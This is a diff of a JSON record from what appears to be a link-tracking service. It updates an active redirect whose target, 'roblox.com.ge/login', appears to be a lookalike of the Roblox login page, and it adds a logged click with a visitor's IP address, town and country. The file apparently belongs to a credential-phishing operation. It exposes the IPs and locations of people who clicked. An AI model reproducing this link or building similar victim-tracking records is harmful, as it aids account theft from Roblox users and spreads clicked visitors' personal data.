@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 968,
+    "useCount": 969,
     "createdBy": "admin",
     "clicks": [
       {
@@ -7862,6 +7862,14 @@
         "ip": "80.76.59.38",
         "country": "United Kingdom",
         "city": "London",
+        "flag": "🇬🇧",
+        "countryCode": "GB"
+      },
+      {
+        "timestamp": 1777214011448,
+        "ip": "31.94.16.60",
+        "country": "United Kingdom",
+        "city": "Bexleyheath",
         "flag": "🇬🇧",
         "countryCode": "GB"
       }
